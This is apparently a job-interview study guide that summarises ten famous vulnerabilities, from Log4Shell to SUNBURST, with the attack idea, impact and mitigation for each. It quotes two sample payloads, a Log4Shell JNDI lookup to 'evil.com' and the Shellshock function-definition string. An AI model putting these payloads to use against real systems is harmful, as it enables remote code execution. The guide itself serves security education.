Interviewers LOVE asking about specific vulnerabilities. Knowing these shows you're current, you understand real-world threats, and you can speak technically. These are the "celebrity vulnerabilities" everyone in security knows.

üèÜ The Hall of Fame - Top 10 CVEs

1. Log4Shell (CVE-2021-44228)

üß† Log4Shell - "The Perfect Storm"

What: Remote Code Execution in Apache Log4j (Java logging library)
CVSS: 10.0 (Critical)
Attack: Inject ${jndi:ldap://evil.com/exploit} into any logged field
Impact: Full system takeover - no authentication needed

Why Famous:

  • Log4j used in MILLIONS of applications
  • Trivially exploitable (just put payload in User-Agent)
  • Zero-click, no auth, remote
  • Affected Minecraft, Apple, Amazon, Twitter, etc.

Interview Memory Hook
"Log4j JNDI injection - attacker injects lookup string, server fetches and executes malicious code. Classic SSRF to RCE. Fix: upgrade to 2.17.0+ or remove JndiLookup class."

2. EternalBlue (CVE-2017-0144)

üß† EternalBlue - "The Worm That Crippled the World"

What: SMBv1 Buffer Overflow in Windows
Port: 445 (SMB)
CVSS: 9.8 (Critical)
Attack: Send malformed SMB packets ‚Üí RCE

Why Famous:

  • Developed by NSA, leaked by Shadow Brokers
  • Powered WannaCry ransomware (200,000+ systems)
  • Powered NotPetya ($10B+ damage)
  • WORMABLE - spreads automatically

Interview Memory Hook
"EternalBlue = SMBv1 on port 445. Wormable, pre-auth RCE. Mitigation: disable SMBv1, block port 445 at perimeter, patch MS17-010."

3. Zerologon (CVE-2020-1472)

üß† Zerologon - "Domain Admin in 3 Seconds"

What: Netlogon cryptographic flaw (AES-CFB8 implementation)
Port: 445 (RPC over SMB)
CVSS: 10.0 (Critical)
Attack: Send all-zero client challenge ‚Üí authenticate as any computer ‚Üí reset DC password

Why Famous:

  • Complete Active Directory takeover in SECONDS
  • No authentication needed
  • Any DC accessible = game over

Interview Memory Hook
"Zerologon = cryptographic flaw in Netlogon. All-zero IV attack. Instant DC compromise. Mitigation: August 2020 patch + enforce secure Netlogon."

4. ProxyLogon (CVE-2021-26855)

üß† ProxyLogon - "Exchange Backdoor"

What: Exchange Server SSRF leading to authentication bypass
Port: 443 (HTTPS)
CVSS: 9.8 (Critical)
Attack: SSRF ‚Üí Auth bypass ‚Üí Webshell drop

Why Famous:

  • Exploited by HAFNIUM (China state actor)
  • 30,000+ organizations compromised
  • Part of a 4-CVE chain
  • Webshells persisted for months

Interview Memory Hook
"ProxyLogon = Exchange SSRF to auth bypass. Pre-auth, internet-facing, mass exploitation. Mitigation: emergency patches, hunt for webshells."

5. PrintNightmare (CVE-2021-34527)

üß† PrintNightmare - "The Printer That Pwned You"

What: Windows Print Spooler RCE
Service: Spooler (runs as SYSTEM)
CVSS: 8.8 (High)
Attack: Load malicious DLL via printer driver ‚Üí SYSTEM privileges

Why Famous:

  • Spooler enabled by default on ALL Windows
  • Runs as SYSTEM = highest privilege
  • Even DCs had it enabled!
  • Multiple variants emerged

Interview Memory Hook
"PrintNightmare = Print Spooler RCE. Loads malicious DLL, runs as SYSTEM. Mitigation: disable Print Spooler on servers/DCs, apply patches."

6. Heartbleed (CVE-2014-0160)

üß† Heartbleed - "The One That Broke the Internet"

What: OpenSSL TLS heartbeat memory disclosure
Port: 443 (any TLS)
CVSS: 7.5 (High)
Attack: Malformed heartbeat request ‚Üí leak up to 64KB of memory

What Leaked:

  • Private keys
  • Session cookies
  • Passwords in memory
  • User data

Interview Memory Hook
"Heartbleed = OpenSSL memory leak. Read server memory including private keys. Mitigation: patch OpenSSL, rotate certificates."

7. Shellshock (CVE-2014-6271)

üß† Shellshock - "Bash Goes Boom"

What: Bash shell environment variable code injection
CVSS: 9.8 (Critical)
Attack: () { :; }; /bin/bash -c "malicious" in any env var

Attack Vectors:

  • CGI scripts (User-Agent ‚Üí env var)
  • DHCP clients
  • SSH ForceCommand

Interview Memory Hook
"Shellshock = Bash env var injection. Function definition executes trailing commands. Affected CGI, DHCP, SSH. Patch Bash immediately."

8. Spring4Shell (CVE-2022-22965)

üß† Spring4Shell - "Log4j's Cousin"

What: Spring Framework RCE via data binding
CVSS: 9.8 (Critical)
Requirements: JDK 9+, Spring MVC, WAR deployment on Tomcat
Attack: Manipulate class loader to write webshell

Note: Less impactful than Log4Shell due to specific requirements

9. Dirty Pipe (CVE-2022-0847)

üß† Dirty Pipe - "Linux Root in Seconds"

What: Linux kernel pipe buffer overflow
CVSS: 7.8 (High)
Attack: Overwrite read-only files (like /etc/passwd)
Impact: Local privilege escalation to root

Affected: Linux kernel 5.8+

Interview Memory Hook
"Dirty Pipe = Linux kernel pipe vulnerability. Overwrites read-only files. Local privesc to root. Patch kernel."

10. SolarWinds/SUNBURST (CVE-2020-10148)

üß† SUNBURST - "The Supply Chain Nightmare"

What: Trojanized SolarWinds Orion update
Type: Supply chain attack (not a traditional CVE)
Attack: Malicious code inserted into legitimate software update

Impact:

  • 18,000+ organizations downloaded backdoor
  • US government agencies compromised
  • Attributed to Russian APT29
  • Demonstrated supply chain risk

Interview Memory Hook
"SUNBURST = supply chain attack via SolarWinds Orion. Malicious update, sophisticated C2. Lesson: validate software supply chain, monitor for anomalies."
